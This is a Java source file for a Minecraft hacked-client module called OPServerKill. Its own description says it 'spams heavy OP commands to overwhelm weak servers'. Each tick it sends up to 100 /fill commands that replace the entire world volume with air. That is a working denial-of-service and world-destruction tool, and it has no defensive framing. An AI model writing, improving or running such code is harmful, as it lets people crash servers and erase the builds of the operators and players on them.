package dev.mlml.korppu.module.modules;

import dev.mlml.korppu.KorppuMod;
import dev.mlml.korppu.config.DoubleSetting;
import dev.mlml.korppu.module.Module;
import dev.mlml.korppu.module.StatusEntry;
import org.lwjgl.glfw.GLFW;

import java.util.List;

public class OPServerKill extends Module {
    private final DoubleSetting commandsPerTick = config.add(new DoubleSetting(
            "Commands/Tick", "How many command payloads to send per tick", 5d, 1d, 100d, 0));

    private int sent;

    public OPServerKill() {
        super("OPServerKill", "Spams heavy OP commands to overwhelm weak servers", GLFW.GLFW_KEY_UNKNOWN);
    }

    @Override
    public void onTick() {
        if (KorppuMod.mc.player == null) return;

        int count = commandsPerTick.getValue().intValue();
        for (int i = 0; i < count; i++) {
            KorppuMod.mc.player.connection.sendCommand("fill -30000000 0 -30000000 30000000 255 30000000 minecraft:air");
            sent++;
        }
    }

    @Override
    public List<StatusEntry> getStatusEntries() {
        return List.of(
                StatusEntry.text("Sent", String.valueOf(sent)),
                StatusEntry.text("Per Tick", String.valueOf(commandsPerTick.getValue().intValue()))
        );
    }
}
